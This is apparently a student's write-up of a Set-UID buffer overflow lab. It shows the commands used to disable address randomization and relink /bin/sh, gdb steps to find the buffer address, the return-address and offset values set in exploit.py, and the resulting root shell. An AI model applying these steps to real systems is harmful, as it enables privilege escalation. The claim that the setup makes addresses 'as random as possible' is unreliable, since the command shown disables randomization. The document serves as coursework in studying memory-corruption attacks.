# Buffer Overflow Attack Lab (Set-UID)

## -> Environment Setup
These command lines prepare the environment and make it as random as possible so to make it difficult to guess the address. 

    sudo sysctl -w kernel.randomize_va_space=0

    sudo ln -sf /bin/zsh /bin/sh   

## -> Task 3: Notes

In my shell, I coded the following information:

I created an empty badfile

    touch badfile

Then, I set a break point at function bof() and then executed the program

    b bof
    run
    next

Then, I took the ebp value, followed by getting the buffer's address and exiting by typing "quit".

    p $ebp
    p &buffer
    quit

Image of terminal provided:
![view_of_the_vm.PNG](https://raw.githubusercontent.com/s-wayd/s-wayd.github.io/main/1st%20screenshot.png)

## -> Opening Nano exploit.py

After having exited, I entered the nano exploit.py by typing just that:

    nano exploit.py

The commands above entered me into an editing program where I made the following edits:

    start = 420
    ret = 0xffffce2c + start
    offset = 108 + 4

Image example provided:
![view_of_the_vm.PNG](https://raw.githubusercontent.com/s-wayd/s-wayd.github.io/main/2nd%20Screenshot.png)

After exiting the editing program, I coded the following commands: 

    ./exploit.py
    ./stack-L1

The above exploit command created the badfile and the stack command launches the attack by running the vulnerable program.
By doing the above commands, I got a root shell!

...and the follwing output appears:

    Input size: 517
    #
    #whoami
    root

Image of output provided:
![view_of_the_vm.PNG](https://raw.githubusercontent.com/s-wayd/s-wayd.github.io/main/3rd%20Screenshot.png)

![view_of_the_vm.PNG](https://raw.githubusercontent.com/s-wayd/s-wayd.github.io/main/4th%20Screenshot.png)


